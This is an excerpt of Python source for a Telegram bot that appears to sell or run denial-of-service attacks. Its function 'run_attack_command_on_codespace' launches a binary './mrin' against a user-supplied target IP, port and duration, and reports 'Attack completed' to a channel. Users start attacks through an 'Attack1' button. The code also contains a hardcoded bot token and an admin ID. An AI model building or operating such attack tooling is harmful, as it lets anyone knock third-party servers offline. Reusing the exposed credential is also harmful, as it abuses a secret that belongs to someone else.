...
expiry_date = datetime(2050, 10, 15)
...
BOT_TOKEN = "7151529676:AAHjg4UKekjZqLdXsveFIfkOHU4OUSV0iVU"
ADMIN_IDS = [1066744659]
TELEGRAM_CHANNEL_ID = "https://t.me/+YnFEAuV0r3VhMjJl"  # Replace with your actual channel ID
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
    command = f"./mrin {target_ip} {target_port} {duration} 1800"
    try:
        ...
        bot.send_message(TELEGRAM_CHANNEL_ID, f"Attack completed: {target_ip}:{target_port} for {duration}s")
...
def send_welcome(message):
    ...
    btn_attack = KeyboardButton("Attack1")
    ...
    welcome_message = (f"Welcome, {username}!\n\n"
                       ...
                       f"Join our channel: {TELEGRAM_CHANNEL_ID}")
